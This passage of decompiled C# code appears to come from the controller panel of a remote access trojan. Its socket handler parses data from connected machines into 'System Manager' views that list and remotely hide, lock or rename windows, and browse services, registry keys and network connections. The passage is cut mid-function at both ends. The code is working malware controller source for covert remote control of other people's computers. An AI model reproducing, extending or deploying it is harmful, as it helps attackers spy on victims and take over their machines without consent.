									text3 = text3 + array41[num61] + "*RVR*" + array41[num61 + 1] + "*RVR*" + array41[num61 + 2] + "*RVR*" + array41[num61 + 3] + "*RVR*" + array41[num61 + 4] + "*RVR*" + array41[num61 + 5] + "*RVR*" + array41[num61 + 6] + "*RVR*";
								}
								else
								{
									ListViewItem val83 = systemM8.AW.get_Items().Add(new ListViewItem(new string[1] { array41[num61] }, 3, systemM8.AW.get_Groups().get_Item(systemM8.AW.get_Groups().get_Count() - 1)));
									num60++;
									val83.get_SubItems().Add(array41[num61 + 1]);
									val83.get_SubItems().Add(array41[num61 + 2]);
									val83.get_SubItems().Add(array41[num61 + 3]);
									val83.get_SubItems().Add(array41[num61 + 4]);
									val83.get_SubItems().Add(array41[num61 + 5]);
									val83.get_SubItems().Add(array41[num61 + 6]);
								}
								num61 += 6;
								num61++;
								num61 += 0;
							}
						}
						catch (Exception projectError57)
						{
							ProjectData.SetProjectError(projectError57);
							ProjectData.ClearProjectError();
						}
						try
						{
							try
							{
								IEnumerator enumerator17 = default(IEnumerator);
								try
								{
									enumerator17 = systemM8.AW.get_Groups().GetEnumerator();
									while (enumerator17.MoveNext())
									{
										ListViewGroup val84 = (ListViewGroup)enumerator17.Current;
										if (Operators.CompareString(val84.get_Header(), "Visible ( 0 )", false) == 0)
										{
											val84.set_Header("Visible ( 0 )".Replace("0", num60.ToString()));
										}
									}
								}
								finally
								{
									if (enumerator17 is IDisposable)
									{
										(enumerator17 as IDisposable).Dispose();
									}
								}
							}
							catch (Exception projectError58)
							{
								ProjectData.SetProjectError(projectError58);
								ProjectData.ClearProjectError();
							}
						}
						catch (Exception projectError59)
						{
							ProjectData.SetProjectError(projectError59);
							ProjectData.ClearProjectError();
						}
						int num64 = 0;
						try
						{
							systemM8.AW.get_Groups().Add("", "Hidden ( 0 )");
							string[] array42 = Strings.Split(text3, "*RVR*", -1, (CompareMethod)0);
							int num65 = 0;
							int num66 = array42.Length - 2;
							num65 = 0;
							while (true)
							{
								int num67 = num65;
								int num5 = num66;
								if (num67 <= num5 && ((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Manager" + array[2]) != null)
								{
									ListViewItem val85 = systemM8.AW.get_Items().Add(new ListViewItem(new string[1] { array42[num65] }, 4, systemM8.AW.get_Groups().get_Item(systemM8.AW.get_Groups().get_Count() - 1)));
									val85.get_SubItems().Add(array42[num65 + 1]);
									val85.get_SubItems().Add(array42[num65 + 2]);
									val85.get_SubItems().Add(array42[num65 + 3]);
									val85.get_SubItems().Add(array42[num65 + 4]);
									val85.get_SubItems().Add(array42[num65 + 5]);
									val85.get_SubItems().Add(array42[num65 + 6]);
									num64++;
									num65 += 6;
									num65++;
									num65 += 0;
									continue;
								}
								break;
							}
						}
						catch (Exception projectError60)
						{
							ProjectData.SetProjectError(projectError60);
							ProjectData.ClearProjectError();
						}
						try
						{
							IEnumerator enumerator18 = default(IEnumerator);
							try
							{
								enumerator18 = systemM8.AW.get_Groups().GetEnumerator();
								while (enumerator18.MoveNext())
								{
									ListViewGroup val86 = (ListViewGroup)enumerator18.Current;
									if (Operators.CompareString(val86.get_Header(), "Hidden ( 0 )", false) == 0)
									{
										val86.set_Header("Hidden ( 0 )".Replace("0", num64.ToString()));
									}
								}
							}
							finally
							{
								if (enumerator18 is IDisposable)
								{
									(enumerator18 as IDisposable).Dispose();
								}
							}
						}
						catch (Exception projectError61)
						{
							ProjectData.SetProjectError(projectError61);
							ProjectData.ClearProjectError();
						}
						try
						{
							systemM8.AW.AutoResizeColumns((ColumnHeaderAutoResizeStyle)1);
						}
						catch (Exception projectError62)
						{
							ProjectData.SetProjectError(projectError62);
							ProjectData.ClearProjectError();
						}
						SystemM systemM9 = (SystemM)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Manager" + array[2]);
						((Control)systemM9.AW).set_Enabled(true);
						((ToolStripItem)systemM9.ToolStripStatusLabel3).set_Text("Windows : ( " + systemM9.AW.get_Items().get_Count() + " )  - List of windows successfully created");
					}
					else if (Operators.CompareString(array[0], "Active Windows Result Options", false) == 0)
					{
						SystemM systemM10 = (SystemM)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Manager" + array[4]);
						if (Operators.CompareString(SocketServer.Decode(array[1]) + array[2], SocketServer.Decode(array[1]) + " has been hide successfully", false) == 0)
						{
							try
							{
								IEnumerator enumerator19 = default(IEnumerator);
								try
								{
									enumerator19 = systemM10.AW.get_Items().GetEnumerator();
									while (enumerator19.MoveNext())
									{
										ListViewItem val87 = (ListViewItem)enumerator19.Current;
										if (Operators.CompareString(val87.get_SubItems().get_Item(1).get_Text(), SocketServer.Decode(array[1]), false) == 0)
										{
											val87.set_ForeColor(Color.MediumPurple);
											((ToolStripItem)systemM10.ToolStripStatusLabel3).set_Text(" Handle ( " + SocketServer.Decode(array[1]) + " )" + array[2]);
										}
									}
								}
								finally
								{
									if (enumerator19 is IDisposable)
									{
										(enumerator19 as IDisposable).Dispose();
									}
								}
							}
							catch (Exception projectError63)
							{
								ProjectData.SetProjectError(projectError63);
								ProjectData.ClearProjectError();
							}
						}
						if (Operators.CompareString(array[2], " has been showed successfully", false) == 0)
						{
							try
							{
								IEnumerator enumerator20 = default(IEnumerator);
								try
								{
									enumerator20 = systemM10.AW.get_Items().GetEnumerator();
									while (enumerator20.MoveNext())
									{
										ListViewItem val88 = (ListViewItem)enumerator20.Current;
										if (Operators.CompareString(val88.get_SubItems().get_Item(1).get_Text(), SocketServer.Decode(array[1]), false) == 0)
										{
											val88.set_ForeColor(Color.Brown);
											((ToolStripItem)systemM10.ToolStripStatusLabel3).set_Text(" Handle ( " + SocketServer.Decode(array[1]) + " )" + array[2]);
										}
									}
								}
								finally
								{
									if (enumerator20 is IDisposable)
									{
										(enumerator20 as IDisposable).Dispose();
									}
								}
							}
							catch (Exception projectError64)
							{
								ProjectData.SetProjectError(projectError64);
								ProjectData.ClearProjectError();
							}
						}
						if (Operators.CompareString(SocketServer.Decode(array[1]) + array[2], SocketServer.Decode(array[1]) + " had been maximize successfully", false) == 0)
						{
							try
							{
								IEnumerator enumerator21 = default(IEnumerator);
								try
								{
									enumerator21 = systemM10.AW.get_Items().GetEnumerator();
									while (enumerator21.MoveNext())
									{
										ListViewItem val89 = (ListViewItem)enumerator21.Current;
										if (Operators.CompareString(val89.get_SubItems().get_Item(1).get_Text(), SocketServer.Decode(array[1]), false) == 0)
										{
											val89.set_ForeColor(Color.DarkGreen);
											((ToolStripItem)systemM10.ToolStripStatusLabel3).set_Text(" Handle ( " + SocketServer.Decode(array[1]) + " )" + array[2]);
										}
									}
								}
								finally
								{
									if (enumerator21 is IDisposable)
									{
										(enumerator21 as IDisposable).Dispose();
									}
								}
							}
							catch (Exception projectError65)
							{
								ProjectData.SetProjectError(projectError65);
								ProjectData.ClearProjectError();
							}
						}
						if (Operators.CompareString(SocketServer.Decode(array[1]) + array[2], SocketServer.Decode(array[1]) + " had been minimize successfully", false) == 0)
						{
							try
							{
								IEnumerator enumerator22 = default(IEnumerator);
								try
								{
									enumerator22 = systemM10.AW.get_Items().GetEnumerator();
									while (enumerator22.MoveNext())
									{
										ListViewItem val90 = (ListViewItem)enumerator22.Current;
										if (Operators.CompareString(val90.get_SubItems().get_Item(1).get_Text(), SocketServer.Decode(array[1]), false) == 0)
										{
											val90.set_ForeColor(Color.DimGray);
											((ToolStripItem)systemM10.ToolStripStatusLabel3).set_Text(" Handle ( " + SocketServer.Decode(array[1]) + " )" + array[2]);
										}
									}
								}
								finally
								{
									if (enumerator22 is IDisposable)
									{
										(enumerator22 as IDisposable).Dispose();
									}
								}
							}
							catch (Exception projectError66)
							{
								ProjectData.SetProjectError(projectError66);
								ProjectData.ClearProjectError();
							}
						}
						if (Operators.CompareString(SocketServer.Decode(array[1]) + array[2], SocketServer.Decode(array[1]) + " had been successfully locked", false) == 0)
						{
							try
							{
								IEnumerator enumerator23 = default(IEnumerator);
								try
								{
									enumerator23 = systemM10.AW.get_Items().GetEnumerator();
									while (enumerator23.MoveNext())
									{
										ListViewItem val91 = (ListViewItem)enumerator23.Current;
										if (Operators.CompareString(val91.get_SubItems().get_Item(1).get_Text(), SocketServer.Decode(array[1]), false) == 0)
										{
											val91.set_ForeColor(Color.DarkKhaki);
										}
									}
								}
								finally
								{
									if (enumerator23 is IDisposable)
									{
										(enumerator23 as IDisposable).Dispose();
									}
								}
							}
							catch (Exception projectError67)
							{
								ProjectData.SetProjectError(projectError67);
								ProjectData.ClearProjectError();
							}
							((ToolStripItem)systemM10.ToolStripStatusLabel3).set_Text(" Handle ( " + SocketServer.Decode(array[1]) + " )" + array[2]);
						}
						if (Operators.CompareString(SocketServer.Decode(array[1]) + array[2], SocketServer.Decode(array[1]) + " had been successfully unlock", false) == 0)
						{
							try
							{
								IEnumerator enumerator24 = default(IEnumerator);
								try
								{
									enumerator24 = systemM10.AW.get_Items().GetEnumerator();
									while (enumerator24.MoveNext())
									{
										ListViewItem val92 = (ListViewItem)enumerator24.Current;
										if (Operators.CompareString(val92.get_SubItems().get_Item(1).get_Text(), SocketServer.Decode(array[1]), false) == 0)
										{
											val92.set_ForeColor(Color.Chocolate);
										}
									}
								}
								finally
								{
									if (enumerator24 is IDisposable)
									{
										(enumerator24 as IDisposable).Dispose();
									}
								}
							}
							catch (Exception projectError68)
							{
								ProjectData.SetProjectError(projectError68);
								ProjectData.ClearProjectError();
							}
							((ToolStripItem)systemM10.ToolStripStatusLabel3).set_Text(" Handle ( " + SocketServer.Decode(array[1]) + " )" + array[2]);
						}
						if (Operators.CompareString(SocketServer.Decode(array[1]) + array[2] + SocketServer.Decode(array[3]), SocketServer.Decode(array[1]) + " had been successfully renamed to ===> " + SocketServer.Decode(array[3]), false) == 0)
						{
							try
							{
								IEnumerator enumerator25 = default(IEnumerator);
								try
								{
									enumerator25 = systemM10.AW.get_Items().GetEnumerator();
									while (enumerator25.MoveNext())
									{
										ListViewItem val93 = (ListViewItem)enumerator25.Current;
										if (Operators.CompareString(val93.get_SubItems().get_Item(1).get_Text(), SocketServer.Decode(array[1]), false) == 0)
										{
											val93.get_SubItems().get_Item(0).set_Text(SocketServer.Decode(array[3]));
											val93.set_ForeColor(Color.DarkOrange);
										}
									}
								}
								finally
								{
									if (enumerator25 is IDisposable)
									{
										(enumerator25 as IDisposable).Dispose();
									}
								}
							}
							catch (Exception projectError69)
							{
								ProjectData.SetProjectError(projectError69);
								ProjectData.ClearProjectError();
							}
							((ToolStripItem)systemM10.ToolStripStatusLabel3).set_Text(" Handle ( " + SocketServer.Decode(array[1]) + " )" + array[2] + SocketServer.Decode(array[3]));
						}
						if (Operators.CompareString(SocketServer.Decode(array[1]) + array[2], SocketServer.Decode(array[1]) + " has been hide unsuccessfully", false) == 0)
						{
							((ToolStripItem)systemM10.ToolStripStatusLabel3).set_Text(" Handle ( " + SocketServer.Decode(array[1]) + " )" + array[2]);
						}
						if (Operators.CompareString(SocketServer.Decode(array[1]) + array[2], SocketServer.Decode(array[1]) + " has been showed unsuccessfully", false) == 0)
						{
							((ToolStripItem)systemM10.ToolStripStatusLabel3).set_Text(" Handle ( " + SocketServer.Decode(array[1]) + " )" + array[2]);
						}
						if (Operators.CompareString(SocketServer.Decode(array[1]) + array[2], SocketServer.Decode(array[1]) + " had been unsuccessfully maximize", false) == 0)
						{
							((ToolStripItem)systemM10.ToolStripStatusLabel3).set_Text(" Handle ( " + SocketServer.Decode(array[1]) + " )" + array[2]);
						}
						if (Operators.CompareString(SocketServer.Decode(array[1]) + array[2], SocketServer.Decode(array[1]) + " had been unsuccessfully minimize", false) == 0)
						{
							((ToolStripItem)systemM10.ToolStripStatusLabel3).set_Text(" Handle ( " + SocketServer.Decode(array[1]) + " )" + array[2]);
						}
						if (Operators.CompareString(SocketServer.Decode(array[1]) + array[2] + SocketServer.Decode(array[3]), SocketServer.Decode(array[1]) + " had been unsuccessfully renamed to ===> " + SocketServer.Decode(array[3]), false) == 0)
						{
							((ToolStripItem)systemM10.ToolStripStatusLabel3).set_Text(" Handle ( " + SocketServer.Decode(array[1]) + " )" + array[2] + SocketServer.Decode(array[3]));
						}
						if (Operators.CompareString(SocketServer.Decode(array[1]) + array[2], SocketServer.Decode(array[1]) + " had been unsuccessfully locked", false) == 0)
						{
							((ToolStripItem)systemM10.ToolStripStatusLabel3).set_Text(" Handle ( " + SocketServer.Decode(array[1]) + " )" + array[2]);
						}
						if (Operators.CompareString(SocketServer.Decode(array[1]) + array[2], SocketServer.Decode(array[1]) + " had been unsuccessfully unlock", false) == 0)
						{
							((ToolStripItem)systemM10.ToolStripStatusLabel3).set_Text(" Handle ( " + SocketServer.Decode(array[1]) + " )" + array[2]);
						}
					}
					else if (Operators.CompareString(array[0], "GetService", false) == 0)
					{
						if (!((Control)this).get_InvokeRequired())
						{
							SystemM systemM11 = (SystemM)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Manager" + array[2]);
							if (Operators.CompareString(array[1], "Done", false) == 0)
							{
								((Control)systemM11.SM).set_Enabled(true);
								((ToolStripItem)systemM11.ToolStripStatusLabel5).set_Text("Services : ( " + systemM11.SM.get_Items().get_Count() + " ) - List of services successfully created");
							}
							string[] array43 = Strings.Split(Conversions.ToString(STRCOMP.Decode(array[1])), "ServicePlugin", -1, (CompareMethod)0);
							systemM11.SM.get_Groups().Add("", "Running Service ( 0 )");
							string text4 = "";
							try
							{
								int num68 = 0;
								int num69 = array43.Length - 1;
								num68 = 0;
								while (true)
								{
									int num70 = num68;
									int num5 = num69;
									if (num70 <= num5)
									{
										if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Manager" + array[2]) != null)
										{
											if (Operators.CompareString(array43[num68], "Stopped", false) == 0)
											{
												text4 = text4 + array43[num68] + "|" + array43[num68 + 1] + "|" + array43[num68 + 2] + "|" + array43[num68 + 3] + "|" + array43[num68 + 4] + "|";
											}
											else if (Operators.CompareString(array43[num68], "Running", false) == 0)
											{
												ListViewItem val94 = systemM11.SM.get_Items().Add(new ListViewItem(new string[1] { array43[num68] }, 0, systemM11.SM.get_Groups().get_Item(systemM11.SM.get_Groups().get_Count() - 1)));
												val94.get_SubItems().Add(array43[num68 + 1]);
												val94.get_SubItems().Add(array43[num68 + 2]);
												val94.get_SubItems().Add(array43[num68 + 3]);
												val94.get_SubItems().Add(array43[num68 + 4]);
											}
											num68 += 4;
											num68++;
											num68 += 0;
											continue;
										}
										s.Send(sock, "Abort");
										break;
									}
									break;
								}
							}
							catch (Exception projectError70)
							{
								ProjectData.SetProjectError(projectError70);
								ProjectData.ClearProjectError();
							}
							try
							{
								IEnumerator enumerator26 = default(IEnumerator);
								try
								{
									enumerator26 = systemM11.SM.get_Groups().GetEnumerator();
									while (enumerator26.MoveNext())
									{
										ListViewGroup val95 = (ListViewGroup)enumerator26.Current;
										if (Operators.CompareString(val95.get_Header(), "Running Service ( 0 )", false) == 0)
										{
											val95.set_Header("Running Service ( 0 )".Replace("0", systemM11.SM.get_Items().get_Count().ToString()));
										}
									}
								}
								finally
								{
									if (enumerator26 is IDisposable)
									{
										(enumerator26 as IDisposable).Dispose();
									}
								}
							}
							catch (Exception projectError71)
							{
								ProjectData.SetProjectError(projectError71);
								ProjectData.ClearProjectError();
							}
							int num74 = default(int);
							try
							{
								string[] array44 = Strings.Split(text4, "|", -1, (CompareMethod)0);
								systemM11.SM.get_Groups().Add("", "Stopped Service ( 0 )");
								int num71 = 0;
								int num72 = array44.Length - 1;
								num71 = 0;
								while (true)
								{
									int num73 = num71;
									int num5 = num72;
									if (num73 > num5)
									{
										break;
									}
									num74++;
									try
									{
										if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Manager" + array[2]) == null)
										{
											s.Send(sock, "Abort");
										}
										else if (array44[num71].Length > 3)
										{
											ListViewItem val96 = systemM11.SM.get_Items().Add(new ListViewItem(new string[1] { array44[num71] }, 1, systemM11.SM.get_Groups().get_Item(systemM11.SM.get_Groups().get_Count() - 1)));
											val96.get_SubItems().Add(array44[num71 + 1]);
											val96.get_SubItems().Add(array44[num71 + 2]);
											val96.get_SubItems().Add(array44[num71 + 3]);
											val96.get_SubItems().Add(array44[num71 + 4]);
											num71 += 4;
										}
									}
									catch (Exception projectError72)
									{
										ProjectData.SetProjectError(projectError72);
										ProjectData.ClearProjectError();
									}
									num71++;
									num71 += 0;
								}
							}
							catch (Exception projectError73)
							{
								ProjectData.SetProjectError(projectError73);
								ProjectData.ClearProjectError();
							}
							try
							{
								IEnumerator enumerator27 = default(IEnumerator);
								try
								{
									enumerator27 = systemM11.SM.get_Groups().GetEnumerator();
									while (enumerator27.MoveNext())
									{
										ListViewGroup val97 = (ListViewGroup)enumerator27.Current;
										if (Operators.CompareString(val97.get_Header(), "Stopped Service ( 0 )", false) == 0)
										{
											val97.set_Header("Stopped Service ( 0 )".Replace("0", (num74 - 1).ToString()));
										}
									}
								}
								finally
								{
									if (enumerator27 is IDisposable)
									{
										(enumerator27 as IDisposable).Dispose();
									}
								}
							}
							catch (Exception projectError74)
							{
								ProjectData.SetProjectError(projectError74);
								ProjectData.ClearProjectError();
							}
							try
							{
								systemM11.SM.AutoResizeColumns((ColumnHeaderAutoResizeStyle)1);
								return;
							}
							catch (Exception projectError75)
							{
								ProjectData.SetProjectError(projectError75);
								ProjectData.ClearProjectError();
								return;
							}
						}
						_data data30 = this.data;
						((Control)this).Invoke((Delegate)data30, new object[2] { sock, b });
					}
					else if (Operators.CompareString(array[0], "Service Status", false) == 0)
					{
						SystemM systemM12 = (SystemM)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Manager" + array[3]);
						((ToolStripItem)systemM12.ToolStripStatusLabel8).set_Text(" - " + SocketServer.Decode(array[1]) + array[2]);
					}
					else if (Operators.CompareString(array[0], "GPI", false) == 0)
					{
						if (((Control)this).get_InvokeRequired())
						{
							_data data31 = this.data;
							((Control)this).Invoke((Delegate)data31, new object[2] { sock, b });
							return;
						}
						SystemM systemM13 = (SystemM)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Manager" + array[1]);
						string[] array45 = Strings.Split(Conversions.ToString(STRCOMP.Decode(array[2])), "*GPI*", -1, (CompareMethod)0);
						int num75 = 0;
						int num76 = array45.Length - 2;
						num75 = 0;
						while (true)
						{
							int num77 = num75;
							int num5 = num76;
							if (num77 <= num5)
							{
								if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Manager" + array[1]) != null)
								{
									if (array45[num75].ToString().Length > 0)
									{
										string empty = string.Empty;
										empty = ((Operators.CompareString(array45[num75 + 1], "", false) != 0) ? array45[num75 + 1] : "-");
										systemM13.ImageList3.get_Images().Add(array45[num75], (Image)new Bitmap(Image.FromStream((Stream)new MemoryStream(Convert.FromBase64String(array45[num75 + 2])))));
										systemM13.PIIT.get_Items().Add(array45[num75], array45[num75], array45[num75]).get_SubItems()
											.Add(empty);
									}
									num75 += 2;
									num75++;
									num75 += 0;
									continue;
								}
								s.Send(sock, "Abort");
								break;
							}
							break;
						}
						try
						{
							systemM13.PIIT.AutoResizeColumns((ColumnHeaderAutoResizeStyle)1);
						}
						catch (Exception projectError76)
						{
							ProjectData.SetProjectError(projectError76);
							ProjectData.ClearProjectError();
						}
						((Control)systemM13.PIIT).set_Enabled(true);
						((ToolStripItem)systemM13.ToolStripStatusLabel9).set_Text("List of pinned items successfully created");
					}
					else if (Operators.CompareString(array[0], "PIS", false) == 0)
					{
						SystemM systemM14 = (SystemM)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Manager" + array[1]);
						if (Operators.CompareString(array[2], "Done!", false) == 0)
						{
							string[] array46 = Strings.Split(array[2], "____", -1, (CompareMethod)0);
							((ToolStripItem)systemM14.ToolStripStatusLabel9).set_Text(SocketServer.Decode(array46[0].ToString()) + " " + array46[1].ToString());
							if (!array46[1].Contains("Unsuccessfully"))
							{
							}
							try
							{
								IEnumerator enumerator28 = default(IEnumerator);
								try
								{
									enumerator28 = systemM14.PIIT.get_Items().GetEnumerator();
									while (enumerator28.MoveNext())
									{
										ListViewItem val98 = (ListViewItem)enumerator28.Current;
										if (Operators.CompareString(val98.get_SubItems().get_Item(0).get_Text(), SocketServer.Decode(array46[0]), false) == 0)
										{
											val98.Remove();
										}
									}
								}
								finally
								{
									if (enumerator28 is IDisposable)
									{
										(enumerator28 as IDisposable).Dispose();
									}
								}
							}
							catch (Exception projectError77)
							{
								ProjectData.SetProjectError(projectError77);
								ProjectData.ClearProjectError();
							}
						}
						((ToolStripItem)systemM14.ToolStripStatusLabel9).set_Text("List of pinned items successfully created");
						((Control)systemM14.PIIT).set_Enabled(true);
					}
					else if (Operators.CompareString(array[0], "Get Sub Keys Names", false) == 0)
					{
						if (((Control)this).get_InvokeRequired())
						{
							_data data32 = this.data;
							((Control)this).Invoke((Delegate)data32, new object[2] { sock, b });
							return;
						}
						SystemM systemM15 = (SystemM)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Manager" + array[3]);
						((Control)systemM15.KeysName).set_Enabled(true);
						((Control)systemM15.RegValues).set_Enabled(true);
						((ToolStripItem)systemM15.ToolStripStatusLabel7).set_Text("List of sub keys and values successfully created");
						systemM15.RegPath.set_Text(SocketServer.Decode(array[2]) + "\\");
						string[] array47 = Strings.Split(Conversions.ToString(STRCOMP.Decode(array[1])), "|x|", -1, (CompareMethod)0);
						int num78 = 0;
						int num79 = array47.Length - 2;
						num78 = 0;
						while (true)
						{
							int num80 = num78;
							int num5 = num79;
							if (num80 > num5)
							{
								break;
							}
							systemM15.KeysName.get_Items().Add(array47[num78], 0);
							num78++;
							num78 += 0;
						}
						string[] array48 = Strings.Split(Conversions.ToString(STRCOMP.Decode(array[4])), "|x|", -1, (CompareMethod)0);
						int num81 = 0;
						int num82 = array48.Length - 2;
						num81 = 0;
						while (true)
						{
							int num83 = num81;
							int num5 = num82;
							if (num83 > num5)
							{
								break;
							}
							object obj7 = ((Operators.CompareString(array48[num81 + 1], "String", false) != 0) ? systemM15.ValuesRegName.get_Items().Add(array48[num81], 2) : systemM15.ValuesRegName.get_Items().Add(array48[num81], 1));
							object obj8 = NewLateBinding.LateGet(obj7, (Type)null, "SubItems", new object[0], (string[])null, (Type[])null, (bool[])null);
							object[] array21 = new object[1];
							object[] array49 = array21;
							string[] array19 = array48;
							string[] array50 = array19;
							int num39 = num81 + 1;
							array49[0] = array50[num39];
							object[] array17 = array21;
							object[] array51 = array17;
							bool[] array23 = new bool[1] { true };
							NewLateBinding.LateCall(obj8, (Type)null, "Add", array51, (string[])null, (Type[])null, array23, true);
							if (array23[0])
							{
								array19[num39] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array17[0]), typeof(string));
							}
							object obj9 = NewLateBinding.LateGet(obj7, (Type)null, "SubItems", new object[0], (string[])null, (Type[])null, (bool[])null);
							array21 = new object[1];
							object[] array52 = array21;
							array19 = array48;
							string[] array53 = array19;
							num39 = num81 + 2;
							array52[0] = array53[num39];
							array17 = array21;
							object[] array54 = array17;
							array23 = new bool[1] { true };
							NewLateBinding.LateCall(obj9, (Type)null, "Add", array54, (string[])null, (Type[])null, array23, true);
							if (array23[0])
							{
								array19[num39] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array17[0]), typeof(string));
							}
							num81 += 2;
							num81++;
							num81 += 0;
						}
						((Control)systemM15.ValuesRegName).set_Enabled(true);
					}
					else if (Operators.CompareString(array[0], "Enter To Sub Key", false) == 0)
					{
						if (((Control)this).get_InvokeRequired())
						{
							_data data33 = this.data;
							((Control)this).Invoke((Delegate)data33, new object[2] { sock, b });
							return;
						}
						SystemM systemM16 = (SystemM)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Manager" + array[2]);
						((Control)systemM16.KeysName).set_Enabled(true);
						((Control)systemM16.RegValues).set_Enabled(true);
						((Control)systemM16.ValuesRegName).set_Enabled(true);
						((ToolStripItem)systemM16.ToolStripStatusLabel7).set_Text("List of sub keys successfully created");
						string[] array55 = Strings.Split(Conversions.ToString(STRCOMP.Decode(array[1])), "|x|", -1, (CompareMethod)0);
						int num84 = 0;
						int num85 = array55.Length - 2;
						num84 = 0;
						while (true)
						{
							int num86 = num84;
							int num5 = num85;
							if (num86 > num5)
							{
								break;
							}
							systemM16.KeysName.get_Items().Add(array55[num84], 0);
							num84++;
							num84 += 0;
						}
						string[] array56 = Strings.Split(Conversions.ToString(STRCOMP.Decode(array[3])), "|x|", -1, (CompareMethod)0);
						int num87 = 0;
						int num88 = array56.Length - 2;
						num87 = 0;
						while (true)
						{
							int num89 = num87;
							int num5 = num88;
							if (num89 > num5)
							{
								break;
							}
							object obj10 = ((Operators.CompareString(array56[num87 + 1], "String", false) != 0) ? systemM16.ValuesRegName.get_Items().Add(array56[num87], 2) : systemM16.ValuesRegName.get_Items().Add(array56[num87], 1));
							object obj11 = NewLateBinding.LateGet(obj10, (Type)null, "SubItems", new object[0], (string[])null, (Type[])null, (bool[])null);
							object[] array21 = new object[1];
							object[] array57 = array21;
							string[] array19 = array56;
							string[] array58 = array19;
							int num39 = num87 + 1;
							array57[0] = array58[num39];
							object[] array17 = array21;
							object[] array59 = array17;
							bool[] array23 = new bool[1] { true };
							NewLateBinding.LateCall(obj11, (Type)null, "Add", array59, (string[])null, (Type[])null, array23, true);
							if (array23[0])
							{
								array19[num39] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array17[0]), typeof(string));
							}
							object obj12 = NewLateBinding.LateGet(obj10, (Type)null, "SubItems", new object[0], (string[])null, (Type[])null, (bool[])null);
							array21 = new object[1];
							object[] array60 = array21;
							array19 = array56;
							string[] array61 = array19;
							num39 = num87 + 2;
							array60[0] = array61[num39];
							array17 = array21;
							object[] array62 = array17;
							array23 = new bool[1] { true };
							NewLateBinding.LateCall(obj12, (Type)null, "Add", array62, (string[])null, (Type[])null, array23, true);
							if (array23[0])
							{
								array19[num39] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array17[0]), typeof(string));
							}
							num87 += 2;
							num87++;
							num87 += 0;
						}
					}
					else if (Operators.CompareString(array[0], "Values Names", false) == 0)
					{
						if (((Control)this).get_InvokeRequired())
						{
							_data data34 = this.data;
							((Control)this).Invoke((Delegate)data34, new object[2] { sock, b });
							return;
						}
						SystemM systemM17 = (SystemM)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Manager" + array[2]);
						string[] array63 = Strings.Split(Conversions.ToString(STRCOMP.Decode(array[1])), "|x|", -1, (CompareMethod)0);
						int num90 = 0;
						int num91 = array63.Length - 2;
						num90 = 0;
						while (true)
						{
							int num92 = num90;
							int num5 = num91;
							if (num92 > num5)
							{
								break;
							}
							object obj13 = ((Operators.CompareString(array63[num90 + 1], "String", false) != 0) ? systemM17.ValuesRegName.get_Items().Add(array63[num90], 2) : systemM17.ValuesRegName.get_Items().Add(array63[num90], 1));
							object obj14 = NewLateBinding.LateGet(obj13, (Type)null, "SubItems", new object[0], (string[])null, (Type[])null, (bool[])null);
							object[] array21 = new object[1];
							object[] array64 = array21;
							string[] array19 = array63;
							string[] array65 = array19;
							int num39 = num90 + 1;
							array64[0] = array65[num39];
							object[] array17 = array21;
							object[] array66 = array17;
							bool[] array23 = new bool[1] { true };
							NewLateBinding.LateCall(obj14, (Type)null, "Add", array66, (string[])null, (Type[])null, array23, true);
							if (array23[0])
							{
								array19[num39] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array17[0]), typeof(string));
							}
							object obj15 = NewLateBinding.LateGet(obj13, (Type)null, "SubItems", new object[0], (string[])null, (Type[])null, (bool[])null);
							array21 = new object[1];
							object[] array67 = array21;
							array19 = array63;
							string[] array68 = array19;
							num39 = num90 + 2;
							array67[0] = array68[num39];
							array17 = array21;
							object[] array69 = array17;
							array23 = new bool[1] { true };
							NewLateBinding.LateCall(obj15, (Type)null, "Add", array69, (string[])null, (Type[])null, array23, true);
							if (array23[0])
							{
								array19[num39] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array17[0]), typeof(string));
							}
							num90 += 2;
							num90++;
							num90 += 0;
						}
					}
					else if (Operators.CompareString(array[0], "Registry Result", false) == 0)
					{
						SystemM systemM18 = (SystemM)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Manager" + array[3]);
						if (Operators.CompareString(SocketServer.Decode(array[1]), "Done!", false) == 0)
						{
							((Control)systemM18.ValuesRegName).set_Enabled(true);
							((ToolStripItem)systemM18.ToolStripStatusLabel7).set_Text("List of values successfully created");
						}
						else
						{
							((ToolStripItem)systemM18.ToolStripStatusLabel7).set_Text(SocketServer.Decode(array[1]) + array[2]);
						}
					}
					else if (Operators.CompareString(array[0], "RSYR", false) == 0)
					{
						SystemM systemM19 = (SystemM)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Manager" + array[3]);
						((ToolStripItem)systemM19.ToolStripStatusLabel7).set_Text(SocketServer.Decode(array[1]) + " " + array[2]);
					}
					else if (Operators.CompareString(array[0], "Get Connections", false) == 0)
					{
						if (!((Control)this).get_InvokeRequired())
						{
							SystemM systemM20 = (SystemM)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Manager" + array[1]);
							if (!STRCOMP.Decode(array[2]).ToString()!.Contains("NTICBLAREVREV"))
							{
								string[] array70 = Strings.Split(Conversions.ToString(STRCOMP.Decode(array[2])), "TCPPlugin", -1, (CompareMethod)0);
								int num93 = 0;
								try
								{
									int num94 = 0;
									int num95 = array70.Length - 2;
